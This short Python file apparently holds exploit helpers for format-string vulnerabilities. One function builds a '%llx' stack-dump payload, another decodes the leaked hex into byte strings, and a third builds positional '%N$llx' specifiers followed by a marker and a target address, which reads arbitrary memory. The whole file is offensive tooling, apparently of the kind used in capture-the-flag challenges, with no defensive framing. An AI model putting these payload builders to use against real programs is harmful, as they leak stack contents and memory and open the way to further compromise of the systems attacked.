from binascii import a2b_hex


def dump_stack(n=100):
    return b".%llx" * n


def read_stack_dump(dump):
    out = b""
    for x in dump.split(b"."):
        out += a2b_hex(x)[::-1]
    return out.split(b"\0")


def fmtstr_read(addr, n=10):
    pl = b"".join([bytes("%{}$llx.".format(x), 'ascii') for x in range(8, 8 + n)])
    return pl + b"\\.DIV.." + addr
